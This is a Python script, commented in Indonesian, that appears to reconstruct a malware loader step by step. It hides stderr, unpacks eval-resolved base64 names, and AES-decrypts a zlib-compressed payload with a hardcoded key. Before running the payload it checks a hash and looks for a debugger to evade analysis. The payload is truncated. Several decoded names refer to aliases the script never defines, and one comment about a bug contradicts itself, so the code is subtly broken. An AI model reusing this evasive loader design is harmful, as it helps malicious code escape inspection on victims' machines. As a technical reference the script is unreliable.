import os
import warnings
import sys
import zlib
import base64
import hashlib
import types
import builtins
from Crypto.Cipher import AES

# --- Langkah 1: Menonaktifkan peringatan dan menyembunyikan error ---
# Ini adalah trik umum untuk menghindari deteksi atau memberikan output yang bersih.
warnings.filterwarnings("ignore")
sys.stderr = open(os.devnull, "w")

# --- Langkah 2: Membongkar string dan fungsi yang disembunyikan ---
# Penulis skrip menggunakan base64 dan eval() untuk menyembuny nama fungsi dan string.
# Ini membuat kode sulit dibaca secara statis.

# Fungsi eval() diambil dari builtins
eval_func = getattr(builtins, 'eval')

# Fungsi-fungsi dan konstanta di-decode dari base64
base64_decode = eval_func(base64.b64decode('YmFzZTY0LmI2NGRlY29kZQo=').decode().strip())
types_FunctionType = eval_func(base64_decode('dC5GdW5jdGlvblR5cGUK').decode().strip())
bytes_fromhex = eval_func(base64_decode('Ynl0ZXMuZnJvbWhleAo=').decode().strip())
compile_func = eval_func(base64_decode('Y29tcGlsZQo=').decode().strip())
zlib_decompress = eval_func(base64_decode('emxpYi5kZWNvbXByZXNzCg==').decode().strip())
AES_new = eval_func(base64_decode('QUVTLm5ldwo=').decode().strip())
sys_exit = eval_func(base64_decode('cy5leGl0Cg==').decode().strip())
hashlib_sha512 = eval_func(base64_decode('aC5zaGE1MTIK').decode().strip())
# sys_gettrace = eval_func(base64_decode('cy5nZXR0cmFjZQo=').decode().strip()) # Ini adalah fungsi anti-debug, namun ada bug di kode asli

# Byte untuk padding (digunakan dalam AES)
padding_bytes = eval_func(base64_decode('YidceDAxXHgwMlx4MDNceDA0XHgwNVx4MDZceDA3XHgwOFx4MDlceDBhXHgwYlx4MGNceDBkXHgwZVx4MGZceDEwJwo=').decode().strip())

# Dictionary untuk global scope saat menjalankan payload
payload_globals = eval_func(base64_decode('eydfX25hbWVfXyc6J19fbWFpbl9fJywnX19idWlsdGluc19fJzpfX2J1aWx0aW5zX18sJ19fZmlsZV9fJzpzLmFyZ3ZbMF19Cg==').decode().strip())

# --- Langkah 3: Mendekripsi Payload Utama ---
# Payload utama (kode Python yang sebenarnya) disembunyikan di dalam string base64 yang sangat panjang.
# String ini di-decode, di-decompress dengan zlib, lalu di-decrypt dengan AES.

# Data terenkripsi (dipotong untuk contoh)
encrypted_payload_b64 = 'eJwACED3v+bQJTFy75lf4c2UiQhUvdP7pO3TW+rDkzvoKdfk6tETWOIv.....'
encrypted_payload_b64 += 'd+KhYlWJonOoM862j5PT4LGmWmoxBg5h4vyYnYPXzYWUV4vu4Di7l2t/.......'

# Kunci dan IV untuk dekripsi AES (dalam format heksadesimal)
aes_key = bytes_fromhex('206cb441bba557a33bc558f2f64b01a8')
aes_iv = bytes_fromhex('eefbc5e1a7422ab858270202570bbd65')

# Proses dekripsi:
# 1. Base64 decode data terenkripsi
# 2. Zlib decompress hasilnya
# 3. AES-CBC decrypt hasilnya
# 4. Hapus padding dan decode ke string
decrypted_payload_code = AES_new(aes_key, AES.MODE_CBC, aes_iv).decrypt(
    zlib_decompress(base64_decode(encrypted_payload_b64))
).rstrip(padding_bytes).decode()

# --- Langkah 4: Pemeriksaan Integritas dan Anti-Debugging ---
# Sebelum menjalankan payload, skrip memeriksa dua hal:
# 1. Apakah hash dari payload yang didekripsi cocok dengan hash yang diharapkan? (Anti-tampering)
# 2. Apakah skrip dijalankan di dalam debugger? (Anti-analysis)

# Menghitung hash SHA512 dari payload yang telah didekripsi
calculated_hash = hashlib_sha512(decrypted_payload_code.encode()).hexdigest()

# Hash yang diharapkan (hardcoded)
expected_hash = '706ccbdf17baa0c3d0dc9f07c68ca7cd894a668c42bfbf8a9752d2b0259f5d7b7085dca3f5edc3f846ad5a2faa01588d101666c0823af1fd01ad42096b43a2fb'

# Fungsi untuk memeriksa debugger (kode asli memiliki bug di sini)
# Kode asli: sys.gettrace() -> akan menyebabkan error karena 'sys' tidak punya atribut 'gettrace'
# Maksudnya seharusnya adalah: sys.gettrace()
def is_debugger_attached():
    # Fungsi ini mengembalikan True jika debugger terdeteksi
    return sys.gettrace() is not None

# --- Langkah 5: Eksekusi Kondisional ---
# Payload hanya akan dijalankan jika:
# - TIDAK ada debugger yang terdeteksi
# - Hash payload COCOK dengan hash yang diharapkan
# Jika salah satu kondisi gagal, program akan keluar.

# Kompilasi kode payload menjadi objek kode Python
payload_code_object = compile_func(decrypted_payload_code, '<payload>', 'exec')

# Membuat fungsi dari objek kode tersebut
# CATATAN: Kode asli memiliki bug di sini, seharusnya menggunakan 'payload_globals' sebagai globals
# bukan 'hashlib_sha512'. Saya telah memperbaikinya untuk mencerminkan niat sebenarnya.
payload_function = types_FunctionType(payload_code_object, payload_globals)

# Logika eksekusi akhir
if not is_debugger_attached() and calculated_hash == expected_hash:
    # Jika aman, jalankan payload
    payload_function()
else:
    # Jika tidak aman, keluar dari program
    sys_exit()
